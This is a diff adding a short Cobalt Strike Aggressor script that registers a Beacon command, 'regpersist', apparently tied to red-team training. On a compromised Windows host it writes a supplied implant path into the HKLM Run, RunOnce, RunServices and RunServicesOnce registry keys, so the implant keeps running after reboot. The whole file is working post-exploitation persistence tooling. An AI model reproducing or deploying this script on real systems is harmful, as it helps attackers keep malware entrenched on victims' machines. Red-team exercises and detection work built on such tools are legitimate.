@@ -1,0 +1,39 @@
+sub regpersist {
+	local('$command $input');
+
+	btask($1, "Tasked Beacon to add registry persistence keys");
+
+	$input = $2;
+
+	btask($1, "Adding Registry Key: Run");
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v CRTO /t REG_SZ /d \"$input\"";
+	btask($1, $command);
+	bshell($1, $command);
+
+	btask($1, "Adding Registry Key: RunOnce");
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v CRTO /t REG_SZ /d \"$input\"";
+	btask($1, $command);
+	bshell($1, $command);
+
+	btask($1, "Adding Registry Key: RunServices");
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v CRTO /t REG_SZ /d \"$input\"";
+	btask($1, $command);
+	bshell($1, $command);
+
+	btask($1, "Adding Registry Key: RunServicesOnce");
+	$command = "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v CRTO /t REG_SZ /d \"$input\"";
+	btask($1, $command);
+	bshell($1, $command);
+}
+
+beacon_command_register("regpersist", "Add registry persistence keys",
+	"Synopsis: regpersist <implant_location>\n\n" .
+	"Adds multiple registry keys for persistence with the specified payload.");
+
+alias regpersist {
+	if ($2 is $null) {
+		berror($1, "No payload specified");
+	} else {
+		regpersist($1, $2);
+	}
+}
